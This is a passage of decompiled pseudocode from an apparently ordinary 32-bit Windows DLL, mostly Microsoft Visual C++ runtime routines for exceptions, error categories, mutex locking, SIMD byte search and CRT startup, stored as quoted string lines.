    "    if ( *((_DWORD *)v9 + 1) )",
    "    {",
    "      j_j_j___free_base(*((void **)v9 + 1));",
    "      *((_DWORD *)v9 + 1) = 0;",
    "    }",
    "    sub_100154EB((void *)v9);",
    "    LOBYTE(v11) = (_BYTE)Block;",
    "  }",
    "  v17 = ppv;",
    "  v6 = *(_DWORD *)ppv;",
    "  if ( (_BYTE)v11 )",
    "    goto LABEL_5;",
    "  (*(void (__stdcall **)(LPVOID))(v6 + 8))(ppv);",
    "  p_psz = (const OLECHAR *)&psz;",
    "  if ( a6 > 7 )",
    "    p_psz = psz;",
    "  v13 = (volatile signed __int32 *)operator new(0xCu);",
    "  v14 = v13;",
    "  v25 = (void *)v13;",
    "  LOBYTE(v30) = 7;",
    "  if ( v13 )",
    "  {",
    "    *(_QWORD *)v13 = 0;",
    "    *((_DWORD *)v13 + 2) = 0;",
    "    *((_DWORD *)v13 + 1) = 0;",
    "    *((_DWORD *)v13 + 2) = 1;",
    "    v15 = SysAllocString(p_psz);",
    "    *v14 = (volatile signed __int32)v15;",
    "    if ( !v15 && p_psz )",
    "      sub_10016590(-2147024882);",
    "  }",
    "  else",
    "  {",
    "    v14 = 0;",
    "  }",
    "  LOBYTE(v30) = 0;",
    "  v25 = (void *)v14;",
    "  if ( !v14 )",
    "LABEL_43:",
    "    sub_10016590(-2147024882);",
    "  LOBYTE(v30) = 8;",
    "  Block = (void *)((unsigned int)(*(int (__stdcall **)(int, volatile signed __int32, _DWORD))(*(_DWORD *)v28 + 60))(",
    "                                   v28,",
    "                                   *v14,",
    "                                   0) >> 31);",
    "  LOBYTE(v30) = 0;",
    "  if ( !_InterlockedDecrement(v14 + 2) )",
    "  {",
    "    if ( *v14 )",
    "    {",
    "      SysFreeString(*(BSTR *)v14);",
    "      *v14 = 0;",
    "    }",
    "    if ( *((_DWORD *)v14 + 1) )",
    "    {",
    "      j_j_j___free_base(*((void **)v14 + 1));",
    "      *((_DWORD *)v14 + 1) = 0;",
    "    }",
    "    sub_100154EB((void *)v14);",
    "  }",
    "  (*(void (__stdcall **)(int))(*(_DWORD *)v28 + 8))(v28);",
    "  CoUninitialize();",
    "  if ( (_BYTE)Block )",
    "    goto LABEL_7;",
    "  v27 = 1;",
    "LABEL_8:",
    "  if ( a6 > 7 )",
    "  {",
    "    v7 = psz;",
    "    if ( 2 * a6 + 2 >= 0x1000 )",
    "    {",
    "      v7 = (OLECHAR *)*((_DWORD *)psz - 1);",
    "      if ( (unsigned int)((char *)psz - (char *)v7 - 4) > 0x1F )",
    "        _invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_100154EB(v7);",
    "  }",
    "  return v27;",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_10014B54(_DWORD *this)",
    "{",
    "  _DWORD *result; // eax",
    "",
    "  this[1] = 0;",
    "  result = this;",
    "  this[2] = 0;",
    "  this[1] = \"bad allocation\";",
    "  *this = &std::bad_alloc::`vftable';",
    "  return result;",
    "}",
    "",
    "",
    "std::exception *__thiscall std::exception::exception(std::exception *this, const char *a2)",
    "{",
    "  const char *v4; // [esp+4h] [ebp-8h] BYREF",
    "  char v5; // [esp+8h] [ebp-4h]",
    "",
    "  v4 = a2;",
    "  v5 = 1;",
    "  *(_DWORD *)this = &std::exception::`vftable';",
    "  *((_DWORD *)this + 1) = 0;",
    "  *((_DWORD *)this + 2) = 0;",
    "  __std_exception_copy(&v4, (char *)this + 4);",
    "  return this;",
    "}",
    "",
    "",
    "char *__thiscall sub_10014BA1(char *this, int a2)",
    "{",
    "  sub_100013F0(this, a2);",
    "  *(_DWORD *)this = &std::invalid_argument::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "std::exception *__thiscall sub_10014BBC(std::exception *this, char *a2)",
    "{",
    "  std::exception::exception(this, a2);",
    "  *(_DWORD *)this = &std::invalid_argument::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "char *__thiscall sub_10014BDB(char *this, int a2)",
    "{",
    "  sub_100013F0(this, a2);",
    "  *(_DWORD *)this = &std::length_error::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "std::exception *__thiscall sub_10014BF6(std::exception *this, char *a2)",
    "{",
    "  std::exception::exception(this, a2);",
    "  *(_DWORD *)this = &std::length_error::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "char *__thiscall sub_10014C15(char *this, int a2)",
    "{",
    "  sub_100013F0(this, a2);",
    "  *(_DWORD *)this = &std::logic_error::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "char *__thiscall sub_10014C30(char *this, int a2)",
    "{",
    "  sub_100013F0(this, a2);",
    "  *(_DWORD *)this = &std::out_of_range::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "std::exception *__thiscall sub_10014C4B(std::exception *this, char *a2)",
    "{",
    "  std::exception::exception(this, a2);",
    "  *(_DWORD *)this = &std::out_of_range::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "char *__thiscall sub_10014C6A(char *this, int a2)",
    "{",
    "  sub_100013F0(this, a2);",
    "  *(_DWORD *)this = &std::runtime_error::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "// Microsoft VisualC 14/net runtime",
    "char *__thiscall unknown_libname_2(char *Block, char a2)",
    "{",
    "}void __cdecl  sub_10014CB2(char *a1)",
    "{",
    "  _BYTE pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF",
    "",
    "  sub_10014BBC((std::exception *)pExceptionObject, a1);",
    "  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);",
    "}",
    "",
    "",
    "void __cdecl  sub_10014CD2(char *a1)",
    "{",
    "  _BYTE pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF",
    "",
    "  sub_10014BF6((std::exception *)pExceptionObject, a1);",
    "  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVlength_error_std__);",
    "}",
    "",
    "",
    "void __cdecl  sub_10014CF2(char *a1)",
    "{",
    "  _BYTE pExceptionObject[12]; // [esp+0h] [ebp-Ch] BYREF",
    "",
    "  sub_10014C4B((std::exception *)pExceptionObject, a1);",
    "  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVout_of_range_std__);",
    "}",
    "",
    "",
    "_DWORD *__thiscall std::_System_error::_System_error(_DWORD *this, int a2, int a3, _DWORD *a4)",
    "{",
    "  char *v5; // eax",
    "  _DWORD *result; // eax",
    "  _DWORD v7[8]; // [esp-18h] [ebp-3Ch] BYREF",
    "  _DWORD v8[6]; // [esp+8h] [ebp-1Ch] BYREF",
    "",
    "  v7[7] = this;",
    "  sub_10009E70(v7, a4);",
    "  v5 = (char *)std::_System_error::_Makestr(v8, a2, a3, v7[0], v7[1], v7[2], v7[3], v7[4]);",
    "  sub_10014DA8(v5);",
    "  sub_100017E0(v8);",
    "  result = this;",
    "  this[3] = a2;",
    "  *this = &std::_System_error::`vftable';",
    "  this[4] = a3;",
    "  return result;",
    "}",
    "",
    "",
    "int __thiscall sub_10014D7E(int this, int a2)",
    "{",
    "  int v3; // edx",
    "  int result; // eax",
    "",
    "  sub_100013F0((char *)this, a2);",
    "  *(_DWORD *)this = &std::_System_error::`vftable';",
    "  v3 = *(_DWORD *)(a2 + 16);",
    "  *(_DWORD *)(this + 12) = *(_DWORD *)(a2 + 12);",
    "  result = this;",
    "  *(_DWORD *)(this + 16) = v3;",
    "  return result;",
    "}",
    "",
    "",
    "std::exception *__thiscall sub_10014DA8(std::exception *this, char *a2)",
    "{",
    "  const char *v2; // eax",
    "",
    "  v2 = a2;",
    "  if ( *((_DWORD *)a2 + 5) > 0xFu )",
    "    v2 = *(const char **)a2;",
    "  std::exception::exception(this, v2);",
    "  *(_DWORD *)this = &std::runtime_error::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_10014DD0(_DWORD *this, int a2)",
    "{",
    "  sub_10014D7E((int)this, a2);",
    "  *this = &std::system_error::`vftable';",
    "  return this;",
    "}",
    "",
    "",
    "// Microsoft VisualC 14/net runtime",
    "_DWORD *__thiscall unknown_libname_3(_DWORD *this, int a2, int a3, void *a4)",
    "{",
    "}bool __cdecl std::operator==(_DWORD *a1, _DWORD *a2)",
    "{",
    "  return *(_DWORD *)(a1[1] + 4) == *(_DWORD *)(a2[1] + 4) && *a1 == *a2;",
    "}",
    "",
    "",
    "std::_Iostream_error_category2 *__thiscall std::_Iostream_error_category2::`scalar deleting destructor'(",
    "        std::_Iostream_error_category2 *this,",
    "        char a2)",
    "{",
    "  if ( (a2 & 1) != 0 )",
    "    sub_100154EB(this);",
    "  return this;",
    "}",
    "",
    "",
    "// Microsoft VisualC 14/net runtime",
    "char *__thiscall unknown_libname_4(char *Block, char a2)",
    "{",
    "}_DWORD *__cdecl std::_System_error::_Makestr(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8)",
    "{",
    "  _DWORD *v8; // eax",
    "  bool v9; // cc",
    "  size_t v10; // ecx",
    "  _DWORD v12[9]; // [esp+18h] [ebp-28h] BYREF",
    "  int v13; // [esp+3Ch] [ebp-4h]",
    "",
    "  v13 = 0;",
    "  if ( a8 )",
    "    sub_10009F60(&a4, &unk_1003035C, 2u);",
    "  v8 = (_DWORD *)std::error_code::message(v12);",
    "  v9 = v8[5] <= 0xFu;",
    "  v10 = v8[4];",
    "  LOBYTE(v13) = 1;",
    "  if ( !v9 )",
    "    v8 = (_DWORD *)*v8;",
    "  sub_10009F60(&a4, v8, v10);",
    "  sub_100017E0(v12);",
    "  sub_10001830(a1, (int)&a4);",
    "  sub_100017E0(&a4);",
    "  return a1;",
    "}",
    "",
    "",
    "void __cdecl  std::_Throw_Cpp_error(int a1)",
    "{",
    "  int v1; // eax",
    "  char *v2; // [esp-4h] [ebp-1Ch]",
    "  _DWORD pExceptionObject[5]; // [esp+4h] [ebp-14h] BYREF",
    "",
    "  v2 = off_10030264[a1];",
    "  v1 = sub_10014FB9();",
    "  unknown_libname_3(pExceptionObject, dword_10030280[a1], v1, v2);",
    "  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVsystem_error_std__);",
    "}",
    "",
    "",
    "_DWORD *__thiscall std::error_category::default_error_condition(void *this, _DWORD *a2, int a3)",
    "{",
    "  _DWORD *result; // eax",
    "",
    "  result = a2;",
    "  *a2 = a3;",
    "  a2[1] = this;",
    "  return result;",
    "}",
    "",
    "",
    "bool __thiscall std::error_category::equivalent(std::error_category *this, const struct std::error_code *a2, int a3)",
    "{",
    "  return *((_DWORD *)this + 1) == *(_DWORD *)(*((_DWORD *)a2 + 1) + 4) && *(_DWORD *)a2 == a3;",
    "}",
    "",
    "",
    "bool __thiscall std::error_category::equivalent(",
    "        std::error_category *this,",
    "        int a2,",
    "        const struct std::error_condition *a3)",
    "{",
    "  _DWORD *v3; // eax",
    "  _BYTE v5[8]; // [esp+8h] [ebp-8h] BYREF",
    "",
    "  v3 = (_DWORD *)(*(int (__thiscall **)(std::error_category *, _BYTE *, int))(*(_DWORD *)this + 12))(this, v5, a2);",
    "  return std::operator==(v3, a3);",
    "}",
    "",
    "",
    "void *(__thiscall ***sub_10014FB9())(std::_Iostream_error_category2 *__hidden this, char)",
    "{",
    "  return &off_1003F000;",
    "}",
    "",
    "",
    "_DWORD *__stdcall std::_Generic_error_category::message(_DWORD *a1, int a2)",
    "{",
    "  char *v2; // eax",
    "",
    "  v2 = (char *)std::_Syserror_map(a2);",
    "  sub_10001880(a1, v2);",
    "  return a1;",
    "}",
    "",
    "",
    "int __thiscall std::error_code::message(_DWORD **this, int a2)",
    "{",
    "  (*(void (__thiscall **)(_DWORD *, int, _DWORD))(*this[1] + 8))(this[1], a2, *this);",
    "  return a2;",
    "}",
    "",
    "",
    "const char *sub_10015004()",
    "{",
    "  return \"generic\";",
    "}",
    "",
    "",
    "int __cdecl _Mtx_lock(_Mtx_t a1)",
    "{",
    "  return mtx_do_lock(a1, 0);",
    "}",
    "",
    "",
    "int __cdecl _Mtx_unlock(_Mtx_t a1)",
    "{",
    "  if ( (*((_DWORD *)a1 + 11))-- == 1 )",
    "  {",
    "    *((_DWORD *)a1 + 10) = -1;",
    "    ReleaseSRWLockExclusive((PSRWLOCK)a1 + 2);",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl mtx_do_lock(RTL_SRWLOCK *a1, int a2)",
    "{",
    "  DWORD CurrentThreadId; // eax",
    "  RTL_SRWLOCK *v4; // ebx",
    "  char *Ptr; // ecx",
    "  PVOID v7; // [esp+4h] [ebp-18h]",
    "  __int64 v8; // [esp+8h] [ebp-14h] BYREF",
    "  int v9; // [esp+10h] [ebp-Ch]",
    "",
    "  CurrentThreadId = GetCurrentThreadId();",
    "  v7 = (PVOID)CurrentThreadId;",
    "  if ( ((int)a1->Ptr & 0xFFFFFEFF) != 1 )",
    "  {",
    "    if ( a2 )",
    "    {",
    "      if ( *(int *)(a2 + 4) >= 0 && (*(_QWORD *)a2 || *(int *)(a2 + 8) > 0) )",
    "      {",
    "        while ( 1 )",
    "        {",
    "          unknown_libname_5(&v8);",
    "          if ( v8 >= *(_QWORD *)a2 && (v8 != *(_QWORD *)a2 || v9 >= *(_DWORD *)(a2 + 8)) )",
    "            goto LABEL_22;",
    "          v4 = a1 + 10;",
    "          if ( a1[10].Ptr == v7 || TryAcquireSRWLockExclusive(a1 + 2) )",
    "            goto LABEL_19;",
    "        }",
    "      }",
    "      v4 = a1 + 10;",
    "      if ( a1[10].Ptr != (PVOID)CurrentThreadId && !TryAcquireSRWLockExclusive(a1 + 2) )",
    "      {",
    "LABEL_22:",
    "        if ( !*(_QWORD *)a2 )",
    "          return 3 - (*(_DWORD *)(a2 + 8) != 0);",
    "        return 2;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      v4 = a1 + 10;",
    "      if ( a1[10].Ptr != (PVOID)CurrentThreadId )",
    "        AcquireSRWLockExclusive(a1 + 2);",
    "    }",
    "LABEL_19:",
    "    Ptr = (char *)a1[11].Ptr;",
    "    a1[11].Ptr = Ptr + 1;",
    "    if ( (int)(Ptr + 1) <= 1 )",
    "    {",
    "      v4->Ptr = v7;",
    "    }",
    "    else if ( ((int)a1->Ptr & 0x100) == 0 )",
    "    {",
    "      a1[11].Ptr = Ptr;",
    "      if ( !a2 )",
    "        return 3;",
    "      goto LABEL_22;",
    "    }",
    "    return 0;",
    "  }",
    "  if ( a1[10].Ptr != (PVOID)CurrentThreadId )",
    "  {",
    "    AcquireSRWLockExclusive(a1 + 2);",
    "    a1[10].Ptr = v7;",
    "  }",
    "  ++a1[11].Ptr;",
    "  return 0;",
    "}",
    "",
    "",
    "__m128i *__stdcall sub_10015170(__m128i *a1, __m128i *a2, unsigned __int8 a3)",
    "{",
    "  __m128i *result; // eax",
    "  int v5; // esi",
    "  int v13; // esi",
    "  unsigned __int8 v19; // dl",
    "  unsigned int v21; // esi",
    "  __m128i *v22; // esi",
    "  __m128i v23; // xmm1",
    "  unsigned int v24; // ecx",
    "",
    "  result = a1;",
    "  v5 = (char *)a2 - (char *)a1;",
    "  if ( (((char *)a2 - (char *)a1) & 0xFFFFFFE0) == 0 || (dword_1003F090 & 0x20) == 0 )",
    "  {",
    "    v21 = v5 & 0xFFFFFFF0;",
    "    if ( v21 )",
    "    {",
    "      v19 = a3;",
    "      if ( (dword_1003F090 & 4) != 0 )",
    "      {",
    "        v22 = (__m128i *)((char *)a1 + v21);",
    "        v23 = _mm_shuffle_epi8(_mm_cvtsi32_si128(a3), (__m128i)0LL);",
    "        while ( 1 )",
    "        {",
    "          v24 = _mm_movemask_epi8(_mm_cmpeq_epi8(*result, v23));",
    "          if ( v24 )",
    "            break;",
    "          if ( ++result == v22 )",
    "            goto LABEL_11;",
    "        }",
    "        _BitScanForward(&v24, v24);",
    "        return (__m128i *)((char *)result + v24);",
    "      }",
    "    }",
    "    else",
    "    {",
    "LABEL_10:",
    "      v19 = a3;",
    "    }",
    "LABEL_11:",
    "    while ( result != a2 )",
    "    {",
    "      if ( result->m128i_i8[0] == v19 )",
    "        break;",
    "      result = (__m128i *)((char *)result + 1);",
    "    }",
    "    return result;",
    "  }",
    "  _ECX = (char)a3;",
    "  __asm",
    "  {",
    "    vpxor   xmm0, xmm0, xmm0",
    "    vmovd   xmm1, ecx",
    "    vpshufb xmm0, xmm1, xmm0",
    "    vinsertf128 ymm2, ymm0, xmm0, 1",
    "  }",
    "  do",
    "  {",
    "    __asm",
    "    {",
    "      vpcmpeqb ymm0, ymm2, ymmword ptr [eax]",
    "      vpmovmskb ecx, ymm0",
    "    }",
    "    if ( _ECX )",
    "      goto LABEL_15;",
    "    result += 2;",
    "  }",
    "  while ( result != (__m128i *)&a1->m128i_i8[((char *)a2 - (char *)a1) & 0xFFFFFFE0] );",
    "  v13 = v5 & 0x1C;",
    "  if ( !v13 )",
    "  {",
    "LABEL_9:",
    "    __asm { vzeroupper }",
    "    goto LABEL_10;",
    "  }",
    "  _ECX = (char *)&unk_100303B0 - (v13 & 0xFFFFFFFC);",
    "  __asm",
    "  {",
    "    vmovdqu ymm1, ymmword ptr [ecx]",
    "    vpmaskmovd ymm0, ymm1, ymmword ptr [eax]",
    "    vpcmpeqb ymm0, ymm0, ymm2",
    "    vpand   ymm0, ymm0, ymm1",
    "    vpmovmskb ecx, ymm0",
    "  }",
    "  if ( !_ECX )",
    "  {",
    "    result = (__m128i *)((char *)result + v13);",
    "    goto LABEL_9;",
    "  }",
    "LABEL_15:",
    "  __asm",
    "  {",
    "    vzeroupper",
    "    tzcnt   ecx, ecx",
    "  }",
    "  return (__m128i *)((char *)result + _ECX);",
    "}",
    "",
    "",
    "__m128i *__stdcall sub_10015280(__m128i *a1, __m128i *a2, __int16 a3)",
    "{",
    "  __m128i *result; // eax",
    "  int v4; // esi",
    "  int v12; // esi",
    "  __int16 v18; // dx",
    "  unsigned int v20; // esi",
    "  __m128i *v21; // esi",
    "  __m128i v22; // xmm0",
    "  __m128i v23; // xmm1",
    "  unsigned int v24; // ecx",
    "",
    "  result = a1;",
    "  v4 = (char *)a2 - (char *)a1;",
    "  if ( (((char *)a2 - (char *)a1) & 0xFFFFFFE0) == 0 || (dword_1003F090 & 0x20) == 0 )",
    "  {",
    "    v20 = v4 & 0xFFFFFFF0;",
    "    if ( v20 )",
    "    {",
    "      v18 = a3;",
    "      if ( (dword_1003F090 & 4) != 0 )",
    "      {",
    "        v21 = (__m128i *)((char *)a1 + v20);",
    "        v22 = _mm_cvtsi32_si128(a3);",
    "        v23 = _mm_shuffle_epi32(_mm_unpacklo_epi16(v22, v22), 0);",
    "        while ( 1 )",
    "        {",
    "          v24 = _mm_movemask_epi8(_mm_cmpeq_epi16(*result, v23));",
    "          if ( v24 )",
    "            break;",
    "          if ( ++result == v21 )",
    "            goto LABEL_11;",
    "        }",
    "        _BitScanForward(&v24, v24);",
    "        return (__m128i *)((char *)result + v24);",
    "      }",
    "    }",
    "    else",
    "    {",
    "LABEL_10:",
    "      v18 = a3;",
    "    }",
    "LABEL_11:",
    "    while ( result != a2 )",
    "    {",
    "      if ( result->m128i_i16[0] == v18 )",
    "        break;",
    "      result = (__m128i *)((char *)result + 2);",
    "    }",
    "    return result;",
    "  }",
    "  _ECX = a3;",
    "  __asm",
    "  {",
    "    vmovd   xmm0, ecx",
    "    vpunpcklwd xmm0, xmm0, xmm0",
    "    vpshufd xmm0, xmm0, 0",
    "    vinsertf128 ymm2, ymm0, xmm0, 1",
    "  }",
    "  do",
    "  {",
    "    __asm",
    "    {",
    "      vpcmpeqw ymm0, ymm2, ymmword ptr [eax]",
    "      vpmovmskb ecx, ymm0",
    "    }",
    "    if ( _ECX )",
    "      goto LABEL_15;",
    "    result += 2;",
    "  }",
    "  while ( result != (__m128i *)&a1->m128i_i8[((char *)a2 - (char *)a1) & 0xFFFFFFE0] );",
    "  v12 = v4 & 0x1C;",
    "  if ( !v12 )",
    "  {",
    "LABEL_9:",
    "    __asm { vzeroupper }",
    "    goto LABEL_10;",
    "  }",
    "  _ECX = (char *)&unk_100303B0 - (v12 & 0xFFFFFFFC);",
    "  __asm",
    "  {",
    "    vmovdqu ymm1, ymmword ptr [ecx]",
    "    vpmaskmovd ymm0, ymm1, ymmword ptr [eax]",
    "    vpcmpeqw ymm0, ymm0, ymm2",
    "    vpand   ymm0, ymm0, ymm1",
    "    vpmovmskb ecx, ymm0",
    "  }",
    "  if ( !_ECX )",
    "  {",
    "    result = (__m128i *)((char *)result + v12);",
    "    goto LABEL_9;",
    "  }",
    "LABEL_15:",
    "  __asm",
    "  {",
    "    vzeroupper",
    "    tzcnt   ecx, ecx",
    "  }",
    "  return (__m128i *)((char *)result + _ECX);",
    "}",
    "",
    "",
    "__m128i *__stdcall sub_100153A0(__m128i *a1, __m128i *a2, unsigned __int8 a3)",
    "{",
    "  return sub_10015170(a1, a2, a3);",
    "}",
    "",
    "",
    "__m128i *__stdcall sub_100153B0(__m128i *a1, __m128i *a2, __int16 a3)",
    "{",
    "  return sub_10015280(a1, a2, a3);",
    "}",
    "",
    "",
    "const char *__cdecl std::_Syserror_map(int a1)",
    "{",
    "  const char *v1; // eax",
    "",
    "  v1 = (const char *)&unk_10030670;",
    "  while ( *(_DWORD *)v1 != a1 )",
    "  {",
    "    v1 += 8;",
    "    if ( v1 == \"success\" )",
    "      return \"unknown error\";",
    "  }",
    "  return (const char *)*((_DWORD *)v1 + 1);",
    "}",
    "",
    "",
    "// Microsoft VisualC 14/net runtime",
    "int __cdecl unknown_libname_5(int a1)",
    "{",
    "}__int64 __cdecl _Xtime_get_ticks()",
    "{",
    "  struct _FILETIME SystemTimeAsFileTime; // [esp+0h] [ebp-8h] BYREF",
    "",
    "  `anonymous namespace'::_UCalendar_deleter::operator()(&SystemTimeAsFileTime, SystemTimeAsFileTime.dwLowDateTime);",
    "  return *(_QWORD *)&SystemTimeAsFileTime - 116444736000000000LL;",
    "}",
    "",
    "",
    "int __cdecl initialize_pointers()",
    "{",
    "  HMODULE ModuleHandleW; // esi",
    "",
    "  ModuleHandleW = GetModuleHandleW(L\"kernel32.dll\");",
    "  GetCurrentPackageId = (LONG (__stdcall *)(UINT32 *, BYTE *))GetProcAddress(ModuleHandleW, \"GetCurrentPackageId\");",
    "  GetSystemTimePreciseAsFileTime = (int)GetProcAddress(ModuleHandleW, \"GetSystemTimePreciseAsFileTime\");",
    "  GetTempPath2W = (int)GetProcAddress(ModuleHandleW, \"GetTempPath2W\");",
    "  return 0;",
    "}",
    "",
    "",
    "void __cdecl `anonymous namespace'::_UCalendar_deleter::operator()(LPFILETIME lpSystemTimeAsFileTime)",
    "{",
    "  if ( GetSystemTimePreciseAsFileTime )",
    "    GetSystemTimePreciseAsFileTime(GetSystemTimePreciseAsFileTime, lpSystemTimeAsFileTime);",
    "  else",
    "    GetSystemTimeAsFileTime(lpSystemTimeAsFileTime);",
    "}",
    "",
    "",
    "void __fastcall __security_check_cookie(uintptr_t StackCookie)",
    "{",
    "  if ( StackCookie != __security_cookie )",
    "    __report_gsfailure();",
    "}",
    "",
    "",
    "void __cdecl sub_100154EB(void *Block)",
    "{",
    "  j_j___free_base(Block);",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_100154F9(_DWORD *Block, char a2)",
    "{",
    "  *Block = &type_info::`vftable';",
    "  if ( (a2 & 1) != 0 )",
    "    sub_100154EB(Block);",
    "  return Block;",
    "}",
    "",
    "",
    "void *__cdecl operator new(size_t Size)",
    "{",
    "  void *result; // eax",
    "",
    "  while ( 1 )",
    "  {",
    "    result = (void *)sub_1001CC90(Size);",
    "    if ( result )",
    "      break;",
    "    if ( !_callnewh(Size) )",
    "    {",
    "      if ( Size != -1 )",
    "        sub_100162BA();",
    "      sub_100014A0(-1);",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "struct _IMAGE_SECTION_HEADER *__cdecl find_pe_section(unsigned __int8 *const a1, unsigned int a2)",
    "{",
    "  unsigned __int8 *v2; // ecx",
    "  int v3; // edx",
    "  int v4; // esi",
    "",
    "  v2 = &a1[*((_DWORD *)a1 + 15)];",
    "  v3 = (int)&v2[*((unsigned __int16 *)v2 + 10) + 24];",
    "  v4 = v3 + 40 * *((unsigned __int16 *)v2 + 3);",
    "  if ( v3 == v4 )",
    "    return 0;",
    "  while ( a2 < *(_DWORD *)(v3 + 12) || a2 >= *(_DWORD *)(v3 + 12) + *(_DWORD *)(v3 + 8) )",
    "  {",
    "    v3 += 40;",
    "    if ( v3 == v4 )",
    "      return 0;",
    "  }",
    "  return (struct _IMAGE_SECTION_HEADER *)v3;",
    "}",
    "",
    "",
    "char __scrt_acquire_startup_lock()",
    "{",
    "  PVOID StackBase; // edx",
    "  signed __int32 v1; // eax",
    "",
    "  if ( __scrt_is_ucrt_dll_in_use() )",
    "  {",
    "    StackBase = NtCurrentTeb()->NtTib.StackBase;",
    "    while ( 1 )",
    "    {",
    "      v1 = _InterlockedCompareExchange(&dword_1003FE08, (signed __int32)StackBase, 0);",
    "      if ( !v1 )",
    "        break;",
    "      if ( StackBase == (PVOID)v1 )",
    "        return 1;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "char __scrt_dllmain_after_initialize_c()",
    "{",
    "  _crt_argv_mode v0; // eax",
    "",
    "  if ( __scrt_is_ucrt_dll_in_use() )",
    "  {",
    "    sub_10015E9C();",
    "  }",
    "  else",
    "  {",
    "    v0 = sub_100162D7();",
    "    if ( _configure_narrow_argv(v0) )",
    "      return 0;",
    "    common_initialize_environment_nolock<char>();",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "bool __scrt_dllmain_before_initialize_c()",
    "{",
    "  return (unsigned __int8)__scrt_initialize_onexit_tables(0) != 0;",
    "}",
    "",
    "",
    "char __scrt_dllmain_crt_thread_attach()",
    "{",
    "  if ( !__vcrt_thread_attach() )",
    "    return 0;",
    "  if ( !(unsigned __int8)sub_1001F977() )",
    "  {",
    "    __vcrt_thread_detach();",
    "    return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char sub_1001561A()",
    "{",
    "  sub_1001F982();",
    "  __vcrt_thread_detach();",
    "  return 1;",
    "}",
    "",
    "",
    "int __cdecl __scrt_dllmain_exception_filter(",
    "        int a1,",
    "        int a2,",
    "        int a3,",
    "        void (__thiscall *a4)(_DWORD, int, _DWORD, int),",
    "        unsigned int ExceptionNum,",
    "        struct _EXCEPTION_POINTERS *ExceptionPtr)",
    "{",
    "  if ( !__scrt_is_ucrt_dll_in_use() && a2 == 1 )",
    "    a4(a4, a1, 0, a3);",
    "  return _seh_filter_dll(ExceptionNum, ExceptionPtr);",
    "}",
    "",
    "",
    "void __scrt_dllmain_uninitialize_c()",
    "{",
    "  if ( __scrt_is_ucrt_dll_in_use() )",
    "  {",
    "    _execute_onexit_table(&Table);",
    "  }",
    "  else if ( !sub_1001EF56() )",
    "  {",
    "    _cexit();",
    "  }",
    "}",
    "",
    "",
    "__vcrt_bool sub_1001567E()",
    "{",
    "  __acrt_uninitialize_critical(0);",
    "  return __vcrt_uninitialize_critical();",
    "}",
    "",
    "",
    "char __cdecl __scrt_initialize_crt(int a1)",
    "{",
    "  if ( !a1 )",
    "    byte_1003FE0C = 1;",
    "  sub_10015E9C();",
    "  if ( !__vcrt_initialize() )",
    "    return 0;",
    "  if ( !__acrt_initialize() )",
    "  {",
    "    __vcrt_uninitialize(0);",
    "    return 0;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __cdecl __scrt_initialize_onexit_tables(unsigned int a1)",
    "{",
    "  if ( byte_1003FE0D )",
    "    return 1;",
    "  if ( a1 > 1 )",
    "  {",
    "    __scrt_fastfail(5);",
    "    __debugbreak();",
    "  }",
    "  if ( !__scrt_is_ucrt_dll_in_use() || a1 )",
    "  {",
    "    Table._first = (_PVFV *)-1;",
    "    Table._last = (_PVFV *)-1;",
    "    Table._end = (_PVFV *)-1;",
    "    stru_1003FE1C._first = (_PVFV *)-1;",
    "    stru_1003FE1C._last = (_PVFV *)-1;",
    "    stru_1003FE1C._end = (_PVFV *)-1;",
    "  }",
    "  else if ( _initialize_onexit_table(&Table) || _initialize_onexit_table(&stru_1003FE1C) )",
    "  {",
    "    return 0;",
    "  }",
    "  byte_1003FE0D = 1;",
    "  return 1;",
    "}",
    "",
    "",
    "bool __cdecl __scrt_is_nonwritable_in_current_image(int a1)",
    "{",
    "  struct _IMAGE_SECTION_HEADER *pe_section; // eax",
    "  bool result; // al",
    "",
    "  result = 0;",
    "  if ( *(_WORD *)&MEMORY[0x10000000] == 23117",
    "    && *(_DWORD *)(MEMORY[0x1000003C] + 0x10000000) == 17744",
    "    && *(_WORD *)(MEMORY[0x1000003C] + 268435480) == 267 )",
    "  {",
    "    pe_section = find_pe_section((unsigned __int8 *const)0x10000000, a1 - 0x10000000);",
    "    if ( pe_section )",
    "    {",
    "      if ( (pe_section->Characteristics & 0x80000000) == 0 )",
    "        return 1;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int32 __cdecl __scrt_release_startup_lock(char a1)",
    "{",
    "  __int32 result; // eax",
    "",
    "  result = __scrt_is_ucrt_dll_in_use();",
    "  if ( result )",
    "  {",
    "    if ( !a1 )",
    "      return _InterlockedExchange(&dword_1003FE08, 0);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "char __cdecl __scrt_uninitialize_crt(__vcrt_bool Terminating, char a2)",
    "{",
    "  if ( !byte_1003FE0C || !a2 )",
    "  {",
    "    __acrt_uninitialize(Terminating);",
    "    __vcrt_uninitialize(Terminating);",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "_onexit_t __cdecl _onexit(_onexit_t Func)",
    "{",
    "  int v1; // eax",
    "",
